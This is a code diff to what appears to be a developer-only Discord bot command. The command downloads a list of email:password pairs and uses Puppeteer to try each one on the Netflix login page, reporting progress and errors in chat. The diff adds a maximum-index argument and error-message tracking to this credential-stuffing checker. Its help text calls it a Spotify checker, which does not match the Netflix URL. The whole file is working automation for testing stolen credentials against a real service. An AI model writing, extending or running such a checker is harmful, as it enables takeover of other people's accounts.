@@ -26,13 +26,15 @@ const puppeteerOptions = {
 const getCredentials = url => fetch(url).then(res => res.text());
 
 let error_count = 0;
+let error_message = "";
 
 const checkCredentials = async (
   { browser, credentials, message, msg },
-  index
+  index,
+  maxIndex
 ) => {
   try {
-    if (index < credentials.length) {
+    if (index < (maxIndex || credentials.length)) {
       const URL = "https://www.netflix.com/login";
       const email = credentials[index].substring(
         0,
@@ -45,7 +47,7 @@ const checkCredentials = async (
       msg.edit(
         `Checking... (${index + 1}/${
           credentials.length
-        })\nErrors: ${error_count}`
+        })\nError: ${error_count}\nMessage: ${error_message}`
       );
 
       const page = await browser.newPage();
@@ -82,22 +84,30 @@ const checkCredentials = async (
         const newBrowser = await puppeteer.launch(puppeteerOptions);
         checkCredentials(
           { browser: newBrowser, credentials, message, msg },
-          index + 1
+          index + 1,
+          maxIndex
         );
       }
 
       if (cred_status === "failed") {
         await page.close();
-        checkCredentials({ browser, credentials, message, msg }, index + 1);
+        checkCredentials(
+          { browser, credentials, message, msg },
+          index + 1,
+          maxIndex
+        );
       }
     }
   } catch (err) {
     error_count++;
+    // eslint-disable-next-line require-atomic-updates
+    error_message = err;
     await browser.close();
     const newBrowser = await puppeteer.launch(puppeteerOptions);
     checkCredentials(
       { browser: newBrowser, credentials, message, msg },
-      index + 1
+      index + 1,
+      maxIndex
     );
   }
 };
@@ -107,10 +117,11 @@ module.exports = {
   aliases: ["nc"],
   description: "Check spotify accounts from a list",
   args: true,
-  usage: `http://example.com/file.txt 12`,
+  usage: `http://example.com/file.txt 1 12`,
   devOnly: true,
   async execute(message, args) {
     const initialIndex = parseInt(args[1], 10) || 0;
+    const maxIndex = parseInt(args[2], 10) || 0;
     const textResult = await getCredentials(args[0]);
     const credentials = textResult
       .split("\n")
@@ -129,7 +140,8 @@ module.exports = {
           message,
           msg
         },
-        initialIndex
+        initialIndex,
+        maxIndex
       );
     });
   }
